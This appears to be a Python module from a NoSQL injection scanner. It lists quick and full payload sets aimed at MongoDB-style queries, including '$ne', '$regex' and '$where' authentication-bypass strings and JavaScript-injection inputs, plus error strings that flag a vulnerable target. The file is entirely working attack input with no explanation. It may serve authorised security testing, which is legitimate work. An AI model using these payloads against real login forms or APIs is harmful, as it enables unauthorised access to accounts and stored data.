
QUICK_PAYLOADS = [
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$gt": 0}',
    '{"$regex": ".*"}',
    "admin' || '1'=='1",
    '{"$exists": true}',
    "true, $where: '1 == 1'",
    "'; return true; var x='",
    '{"$or": [{"a": 1}, {"b": 2}]}',
]

FULL_PAYLOADS = [
    '{"$ne": -1}',
    '{"$nin": []}',
    '{"$regex": "^a"}',
    '{"$regex": "^admin"}',
    '{"$where": "this.password.length > 0"}',
    '{"$where": "return true"}',
    "' || 1==1//",
    "' || '' == '",
    '{"$lt": "zzz"}',
    '{"$gte": ""}',
    "admin' && this.password.length > 0 || 'a'=='a",
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    "1'; return true; '",
    "this.password.match(/.*/)//+%00",
    '{"$or": [{}, {"a": 1}]}',
]

DETECTION_PATTERNS = [
    "mongoerror",
    "mongo",
    "bson",
    "objectid",
    "mongodb",
    "$err",
    "command failed",
    "unterminated string",
    "json parse error",
    "unexpected token",
    "syntaxerror",
    "couchdb",
]
